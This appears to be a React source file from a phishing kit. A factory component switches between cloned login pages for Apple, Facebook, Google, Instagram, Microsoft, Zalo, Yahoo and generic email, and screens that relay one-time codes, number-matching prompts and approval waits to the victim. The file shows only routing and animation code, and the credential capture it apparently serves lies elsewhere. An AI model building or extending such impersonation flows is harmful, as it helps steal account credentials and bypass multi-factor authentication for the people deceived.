import React from 'react';
import { AnimatePresence, motion } from 'framer-motion';

import AppleClone from './AppleClone';
import FacebookClone from './FacebookClone';
import GoogleClone from './GoogleClone';
import InstagramClone from './InstagramClone';
import MicrosoftClone from './MicrosoftClone';
import ZaloClone from './ZaloClone';
import YahooClone from './YahooClone';
import EmailClone from './EmailClone';
import OtpClone from './OtpClone';
import PendingApprovalScreen from './PendingApprovalScreen';
import LoginFailedScreen from './LoginFailedScreen';
import NumberMatchingScreen from './NumberMatchingScreen';
import WaitingForApprovalScreen from './WaitingForApprovalScreen';
import ApprovalRequiredScreen from './ApprovalRequiredScreen';

const platformComponents = {
  apple: AppleClone,
  facebook: FacebookClone,
  google: GoogleClone,
  instagram: InstagramClone,
  microsoft: MicrosoftClone,
  zalo: ZaloClone,
  yahoo: YahooClone,
  email: EmailClone,
};

const stateComponents = {
  otp: OtpClone,
  pending_approval: PendingApprovalScreen,
  login_failed: LoginFailedScreen,
  number_matching: NumberMatchingScreen,
  waiting_for_approval: WaitingForApprovalScreen,
  approval_required: ApprovalRequiredScreen,
};

const LoginCloneFactory = ({ step, platform, ...props }) => {
  let ComponentToRender = null;
  const componentKey = step === 'login_form' ? platform?.key : step;
  
  if (step === 'login_form' && platform) {
    ComponentToRender = platformComponents[platform.key];
  } else {
    ComponentToRender = stateComponents[step];
  }
  
  const motionProps = {
    key: componentKey,
    initial: { opacity: 0, scale: 0.95, y: 20 },
    animate: { opacity: 1, scale: 1, y: 0 },
    exit: { opacity: 0, scale: 0.95, y: -20 },
    transition: { type: 'spring', stiffness: 260, damping: 25 },
  };

  return (
    <AnimatePresence mode="wait">
      {ComponentToRender && (
        <motion.div {...motionProps} className="w-full h-full">
          <ComponentToRender {...props} platform={platform} />
        </motion.div>
      )}
    </AnimatePresence>
  );
};

export default LoginCloneFactory;